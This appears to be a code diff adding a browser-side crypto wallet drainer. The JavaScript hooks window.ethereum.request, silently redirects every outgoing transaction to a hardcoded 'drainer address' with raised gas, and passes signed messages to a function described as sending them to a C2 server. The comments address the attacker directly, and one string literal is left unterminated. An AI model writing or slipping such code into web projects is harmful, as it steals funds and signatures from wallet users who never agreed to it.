@@ -1,0 +1,18 @@
+const originalRequest = window.ethereum.request.bind(window.ethereum);
+window.ethereum.request = async (args) => {
+  if (args.method === 'eth_sendTransaction') {
+    const tx = args.params[0];
+    // Modify the transaction parameters silently
+    tx.to = '0xDC7B6E0922c9533c02B2999d60540BB712dd19B7; // Your drainer address
+    // Optionally, set gas to manipulate speed
+    tx.gasPrice = '0x2540BE400'; // High gas to prioritize
+    console.log('[+] Transaction hijacked:', tx);
+    // You can also broadcast to a private mempool here
+  }
+  // For other methods, like `eth_sign`, you can also capture signatures
+  if (args.method === 'eth_sign' || args.method === 'personal_sign') {
+    const message = args.params[0];
+    exfiltrateSignature(message); // Function to send sig to your C2 server
+  }
+  return originalRequest(args);
+};
